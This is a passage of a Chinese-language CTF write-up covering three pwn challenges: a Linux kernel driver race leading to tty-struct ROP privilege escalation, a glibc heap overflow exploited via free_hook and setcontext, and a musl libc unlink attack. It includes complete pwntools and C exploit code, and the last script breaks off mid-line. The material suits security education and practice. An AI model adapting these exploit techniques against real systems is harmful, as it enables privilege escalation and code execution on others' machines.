class="line"><span class="type">char</span> buf[<span class="number">0x1000</span>];</span><br><span class="line"><span class="type">pthread_t</span> t1;</span><br><span class="line"><span class="type">int</span> fd1 = open(<span class="string">&quot;/dev/noob&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">input</span> <span class="title">current_input</span>;</span></span><br><span class="line">current_input.index = <span class="number">0</span>;</span><br><span class="line">current_input.buf = buf;</span><br><span class="line">current_input.size = <span class="number">0x0</span>;</span><br><span class="line"></span><br><span class="line">pthread_create(&amp;t1, <span class="literal">NULL</span>, change_size, &amp;current_input);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100000</span>; ++i)</span><br><span class="line">&#123;</span><br><span class="line">ioctl(fd1, <span class="number">0x30000</span>, &amp;current_input);</span><br><span class="line">current_input.size = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line">has_changed = <span class="number">1</span>;</span><br><span class="line">pthread_join(t1, <span class="literal">NULL</span>);</span><br><span class="line">getchar();</span><br><span class="line"></span><br><span class="line"><span class="comment">// free 0x2e0 chunk</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;maybe freed 0x2e0 chunk\n&quot;</span>);</span><br><span class="line">ioctl(fd1, <span class="number">0x30001</span>, &amp;current_input);</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd2 = open(<span class="string">&quot;/dev/ptmx&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(fd2 &lt; <span class="number">0</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;open ptmx error\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;open tty finished\n&quot;</span>);</span><br><span class="line"><span class="type">size_t</span> fake_stack = xchg_rax_rsp_r &amp; <span class="number">0xffffffff</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;fake stack %lx---%lx\n&quot;</span>, fake_stack, fake_stack&amp;<span class="number">0xfffff000</span>);</span><br><span class="line"><span class="type">size_t</span> rop_chain = mmap((<span class="type">void</span> *)(fake_stack&amp;<span class="number">0xfffff000</span>), <span class="number">0x1000</span>, <span class="number">7</span>, <span class="number">0x22</span>, <span class="number">-1</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span>(!rop_chain)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mmap error\n&quot;</span>);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;mmap finished, %lx\n&quot;</span>, rop_chain);</span><br><span class="line"><span class="type">size_t</span> rop[] = &#123;</span><br><span class="line">p_rdi_r,</span><br><span class="line"><span class="number">0x6f0</span>,</span><br><span class="line">mv_rc4_rdi_p_rbp_r,</span><br><span class="line"><span class="number">0</span>,</span><br><span class="line">getroot</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">memset</span>(&amp;fake_tty, <span class="number">0</span>, <span class="keyword">sizeof</span>(<span class="keyword">struct</span> tty_operations));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;memset finished\n&quot;</span>);</span><br><span class="line">fake_tty.ioctl = xchg_rax_rsp_r;</span><br><span class="line"><span class="built_in">memcpy</span>((<span class="type">void</span> *)fake_stack, rop, <span class="keyword">sizeof</span>(rop));</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;rop memcpy finished\n&quot;</span>);</span><br><span class="line"><span class="type">size_t</span> ori_tty[<span class="number">0x30</span>/<span class="number">8</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">current_input.buf = ori_tty;</span><br><span class="line">current_input.size = <span class="number">0x30</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;reading buf form kernel\n&quot;</span>);</span><br><span class="line">ioctl(fd1, <span class="number">0x30003</span>, &amp;current_input);</span><br><span class="line">ori_tty[<span class="number">3</span>] = &amp;fake_tty;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i =<span class="number">0</span>;i&lt;(<span class="number">0x30</span>/<span class="number">8</span>);i++)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%lx\n&quot;</span>,ori_tty[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    getchar();</span><br><span class="line">ioctl(fd1, <span class="number">0x30002</span>, &amp;current_input);</span><br><span class="line">ioctl(fd2, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809211950.png" alt="图片无法显示，请联系作者" title=" "><h2 id="Lgd"><a href="#Lgd" class="headerlink" title="Lgd"></a>Lgd</h2><h3 id="分析-4"><a href="#分析-4" class="headerlink" title="分析"></a>分析</h3><p>程序提供了四种方法<code>add,delete,show,edit</code>。并且使用了<code>prctl</code>函数，不允许调用<code>execve</code>。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809222611.png" alt="图片无法显示，请联系作者" title=" "><p>在<code>add,delete</code>函数中存在大量的<code>emmm</code>应该是无关代码吧，观察到好像都是<code>0</code>，我们只需要关注这几个语句就可以了</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809223026.png" alt="图片无法显示，请联系作者" title=" "><p><code>add</code>函数按照用户的输入申请相应大小的内存，最大不超过<code>0x1000</code>大小，接着读取<code>0x200</code>字节的输入到<code>bbs</code>段中，并将用户输入的字符串的长度保存在<code>0x603260</code>地址处。<code>bug</code>是堆块列表</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809223225.png" alt="图片无法显示，请联系作者" title=" "><p><code>delete</code>函数则将<code>buf[index]</code>中存储的堆块释放掉。<code>puts</code>函数则是将<code>buf[index]</code>即用户的输入输出。</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200809224002.png" alt="图片无法显示，请联系作者" title=" "><p><code>edit</code>函数则按照<code>0x603260</code>位置处存储的长度重新读取用户输入的数据。这里就出现问题了，因为<code>0x603260</code>中存储的是用户输入到<code>bbs</code>段中的数据最大为<code>0x200</code>字节，而我们申请的堆块的大小可以小于<code>0x200</code>，因此造成了堆溢出。</p><h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><ul><li>申请一块<code>unsorted bin</code>并释放，利用堆溢出或者<code>UAF</code>泄露<code>libc</code>基址</li><li>利用堆溢出修改<code>fastbin fd</code>指针，<code>fastbin attack</code>配合<code>unsorted bin attack</code>申请堆块到<code>free_hook</code>附近位置，覆盖<code>free_hook</code>指针为<code>setcontext+53</code>的地址</li><li>利用<code>setcontext</code>重新获取控制流，调用<code>mprotect</code>将写入<code>shellcode</code>的堆块关闭不可执行保护，执行<code>shellcode</code>。</li></ul><blockquote><p><code>setcontext</code>函数是用来设置用户上下文的，当我们可以小范围的控制执行流，并且知道<code>libc</code>基址的时候可以利用<code>setcontext+53</code>扩大控制范围。<code>int setcontext(const ucontext_t *ucp);</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;setcontext+53&gt;:  mov    rsp,QWORD PTR [rdi+0xa0]</span><br><span class="line">&lt;setcontext+60&gt;:  mov    rbx,QWORD PTR [rdi+0x80]</span><br><span class="line">&lt;setcontext+67&gt;:  mov    rbp,QWORD PTR [rdi+0x78]</span><br><span class="line">&lt;setcontext+71&gt;:  mov    r12,QWORD PTR [rdi+0x48]</span><br><span class="line">&lt;setcontext+75&gt;:  mov    r13,QWORD PTR [rdi+0x50]</span><br><span class="line">&lt;setcontext+79&gt;:  mov    r14,QWORD PTR [rdi+0x58]</span><br><span class="line">&lt;setcontext+83&gt;:  mov    r15,QWORD PTR [rdi+0x60]</span><br><span class="line">&lt;setcontext+87&gt;:  mov    rcx,QWORD PTR [rdi+0xa8]</span><br><span class="line">&lt;setcontext+94&gt;:  push   rcx</span><br><span class="line">&lt;setcontext+95&gt;:  mov    rsi,QWORD PTR [rdi+0x70]</span><br><span class="line">&lt;setcontext+99&gt;:  mov    rdx,QWORD PTR [rdi+0x88]</span><br><span class="line">&lt;setcontext+106&gt;: mov    rcx,QWORD PTR [rdi+0x98]</span><br><span class="line">&lt;setcontext+113&gt;: mov    r8,QWORD PTR [rdi+0x28]</span><br><span class="line">&lt;setcontext+117&gt;: mov    r9,QWORD PTR [rdi+0x30]</span><br><span class="line">&lt;setcontext+121&gt;: mov    rdi,QWORD PTR [rdi+0x68]</span><br><span class="line">&lt;setcontext+125&gt;: xor    eax,eax</span><br><span class="line">&lt;setcontext+127&gt;: ret    </span><br></pre></td></tr></table></figure><p>可以直接使用<code>pwntools</code>中的<code>SigreturnFrame</code>来构造<code>ucontext_t</code>结构体</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">frame.rsp = shellcode_address</span><br><span class="line">frame.rdi = shellcode_address &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br></pre></td></tr></table></figure><p><code>rip</code>是执行完<code>setcontext</code>之后需要执行的指令地址，<code>rsp</code>则是执行完<code>rip</code>指令之后再次执行的指令地址，即可以连续控制。</p><p>可以利用此调用<code>mprotect</code>关闭不可执行保护之后跳转到<code>shellcode</code>地址去执行。也可以直接构造<code>rop</code>链</p></blockquote><h4 id="EXP-3"><a href="#EXP-3" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># encoding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./pwn&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path])</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b*0x4022F7&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;/home/pwn/Desktop/glibc/x64/glibc-2.23/lib/libc.so.6&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">length, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;______?\n&quot;</span>, <span class="built_in">str</span>(length))</span><br><span class="line">    p.sendafter(<span class="string">&quot;yes_or_no?\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;index ?\n&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&quot;new_content ?\n&quot;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">shut</span>():</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;&gt;&gt; &quot;</span>, <span class="string">&quot;5&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">name = <span class="string">&quot;1212&quot;</span></span><br><span class="line">p.sendlineafter(<span class="string">&quot;is your name?&quot;</span>, name)</span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x48</span>+<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;b&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>)) - <span class="number">88</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>] - <span class="number">0x10</span></span><br><span class="line">main_arena_address = libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]+<span class="number">0x10</span></span><br><span class="line">free_hook_address = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;lib address &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc.address)))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x48</span> + p64(<span class="number">0x111</span>)</span><br><span class="line">payload +=  p64(main_arena_address + <span class="number">88</span>)+ p64(free_hook_address - <span class="number">0x40</span>)</span><br><span class="line">payload += <span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf8</span> + p64(<span class="number">0x71</span>) + p64(free_hook_address - <span class="number">0x33</span>)</span><br><span class="line"></span><br><span class="line">shellcode_address = <span class="number">0x603060</span>+<span class="number">0x100</span></span><br><span class="line">shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&quot;./flag&quot;</span>)</span><br><span class="line">shellcode += shellcraft.read(<span class="string">&quot;rax&quot;</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">shellcode += shellcraft.write(<span class="number">1</span>, <span class="string">&quot;rsp&quot;</span>, <span class="number">0x100</span>)</span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">add(<span class="number">0x100</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">&quot;\x90&quot;</span>*<span class="number">0x200</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&quot;\x90&quot;</span>*<span class="number">0x100</span> + (p64(shellcode_address+<span class="number">0x8</span>) + asm(shellcode)).ljust(<span class="number">0x100</span>, <span class="string">b&quot;\x90&quot;</span>))</span><br><span class="line">edit(<span class="number">3</span>, p64(<span class="number">0</span>)*<span class="number">4</span> + <span class="string">b&quot;\x00&quot;</span>*<span class="number">3</span> + p64(libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">53</span>))</span><br><span class="line"></span><br><span class="line">frame = SigreturnFrame()</span><br><span class="line">frame.rip = libc.sym[<span class="string">&#x27;mprotect&#x27;</span>]</span><br><span class="line">frame.rsp = shellcode_address</span><br><span class="line">frame.rdi = shellcode_address &amp; <span class="number">0xfffffffffffff000</span></span><br><span class="line">frame.rsi = <span class="number">0x1000</span></span><br><span class="line">frame.rdx = <span class="number">7</span></span><br><span class="line">edit(<span class="number">2</span>, <span class="built_in">bytes</span>(frame))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="Musl"><a href="#Musl" class="headerlink" title="Musl"></a>Musl</h2><h3 id="分析-5"><a href="#分析-5" class="headerlink" title="分析"></a>分析</h3><p>这道题目的<code>libc</code>库时<code>musl libc 1.1.24</code>。程序共提供了四种方法<code>add,delete,edit,show</code>，其中<code>add</code>函数中可以堆溢出一次，<code>show</code>函数只能调用一次。</p><p><code>musl</code>的<code>libc</code>是简化版的<code>glibc</code>，其<code>chunk</code>的数据结构与<code>glibc chunk</code>类似，但是没有<code>fastbin</code>这些操作，相同大小的<code>chunk</code>通过一个双向链表链接起来。申请和释放<code>chunk</code>的时候没有进行安全检查，只要是<code>fd,bk</code>指针指向合法的内存就可以。</p><h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3><ul><li><p>首先，由于<code>chunk</code>是通过双向链表进行连接的，因此释放再申请时，堆块中就残留有<code>libc</code>的地址数据，据此可以泄露出<code>libc</code>的基址。而<code>mmap</code>的第一个参数为<code>0</code>的时候，其映射的地址空间并不是随机的而是和<code>libc</code>基址有着固定的偏移</p><img src="https://lyyl-1254465038.cos.ap-beijing.myqcloud.com/%E9%AB%98%E6%A0%A1%E6%88%98%E7%96%AB%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%88%86%E4%BA%AB%E8%B5%9B-WP/20200810170032.png" alt="图片无法显示，请联系作者" title=" "><p>因此我们也可以得到<code>mmap</code>的地址</p></li><li><p>由于我们可以控制<code>fd,bk</code>指针，因此可以直接将堆块分配到<code>mmap</code>地址处</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">c-&gt;prev-&gt;next = c-&gt;next;</span><br><span class="line">c-&gt;next-&gt;prev = c-&gt;prev;</span><br></pre></td></tr></table></figure><p>将<code>prev</code>即<code>fd</code>指针设置为<code>mmap_address+8</code>，那么在对堆块进行<code>unbin</code>的时候，就会将<code>mmap_address+0x20</code>的位置写入<code>binmap</code>的值，而<code>binmap.prev</code>的值会被改写为<code>mmap_address+8</code>，这样我们再次申请一块相同大小的<code>chunk</code>的时候，就会将<code>mmap_address+0x8</code>代表的堆块分配出来。此时的<code>fd,bk</code>指针分别为<code>mmap_address+0x18,mmap_address+0x20</code>，两个内存地址都是可写的，因此没有问题。</p></li><li><p>此时我们就获得了<code>mmap_address</code>内存区域的任意写权限，可以通过<code>environ</code>泄露<code>stack</code>地址，改写返回地址为<code>rop</code>链<code>getshell</code>。</p></li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># encoding=utf-8</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">file_path = <span class="string">&quot;./carbon&quot;</span></span><br><span class="line">context.arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line">elf = ELF(file_path)</span><br><span class="line">debug = <span class="number">1</span></span><br><span class="line"><span class="keyword">if</span> debug:</span><br><span class="line">    p = process([file_path], env=&#123;<span class="string">&quot;LD_PRELOAD&quot;</span>: <span class="string">&quot;./libc.so&quot;</span>&#125;)</span><br><span class="line">    gdb.attach(p, <span class="string">&quot;b *0x401090&quot;</span>)</span><br><span class="line">    libc = ELF(<span class="string">&#x27;./libc.so&#x27;</span>)</span><br><span class="line">    one_gadget = <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;&#x27;, 0)</span></span><br><span class="line"><span class="string">    libc = ELF(&#x27;</span><span class="string">&#x27;)</span></span><br><span class="line"><span class="string">    one_gadget = 0x0</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def add(length, content, choice=&quot;n&quot;):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;1&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;size? &gt;&quot;, str(length))</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;a believer? &gt;&quot;, choice)</span></span><br><span class="line"><span class="string">    p.sendafter(&quot;new sleeve &gt;&quot;, content)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def delete(index):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;2&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;sleeve ID? &gt;&quot;, str(index))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def edit(index, content):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;3&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;sleeve ID? &gt;&quot;, str(index))</span></span><br><span class="line"><span class="string">    p.send(content)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def show(index):</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;4&quot;)</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;sleeve ID? &gt;&quot;, str(index))</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">def shut():</span></span><br><span class="line"><span class="string">    p.sendlineafter(&quot;&gt; &quot;, &quot;5&quot;)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">add(0x1, &#x27;</span>a<span class="number">&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc.address = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\x00&quot;</span>)) - <span class="number">0x292e61</span></span><br><span class="line">mmap_address = libc.address + <span class="number">0x290000</span></span><br><span class="line"><span class="built_in">log</span>.success(<span class="string">&quot;libc address &#123;&#125;&quot;</span>.format(hex(libc.address)))</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x40</span>)#<span class="number">1</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)#<span class="number">3</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x30</span>)#<span class="number">5</span></span><br><span class="line">add(<span class="number">0x10</span>, <span class="string">&#x27;a&#x27;</span>*<span class="number">0x10</span>)#<span class="number">6</span></span><br><span class="line"></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x40</span>, b<span class="number">&#x27;</span>a<span class="number">&#x27;</span>*<span class="number">0x70</span> + p64(<span class="number">0x21</span>) + p64(<span class="number">0x40</span>)+ p64(mmap_address+<span class="number">8</span>)[:<span class="number">6</span>]+b<span class="string">&quot;\n&quot;</span>, <span class="string">&#x27;Y&#x27;</span>)# <span class="number">1</span></span><br><span class="line">add(<span class="number">0x30</span>, <span class="string">&quot;a&quot;</span>*<span class="number">0x30</span>) # <span 